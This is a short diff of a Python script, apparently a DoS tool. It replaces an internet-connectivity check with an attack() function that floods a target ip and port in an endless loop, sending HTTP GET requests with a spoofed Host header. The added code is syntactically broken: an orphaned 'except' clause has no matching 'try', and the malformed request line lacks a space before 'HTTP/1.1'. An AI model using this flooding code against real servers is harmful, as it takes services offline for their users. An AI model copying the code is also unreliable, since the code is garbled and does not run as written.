@@ -88,11 +88,16 @@ yellow = "\033[1;33m"
 white = "\033[1;37m"
 default = "\033[0m"
 
-def check_net_con():
-  try:
-    sock = socket(AF_INET,SOCK_STREAM)
-    sock.connect(("www.google.com",80))
-  except gaierror:
+fackip = "77.109.33.232"
+Counter = 0
+
+def attack():
+  while True:
+   s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+   s.connect((ip , port))
+   s.sendto(("GET /"+ip+"HTTP/1.1\r\n").encode("ascii"),(ip , port))
+   s.sendto(("Host:"+fackip+"\r\n\r\n").encode("ascii"),(ip , port))
+except gaierror:
     print(f"{red} please Check Your Internet Connection {default}")
     exit()
 
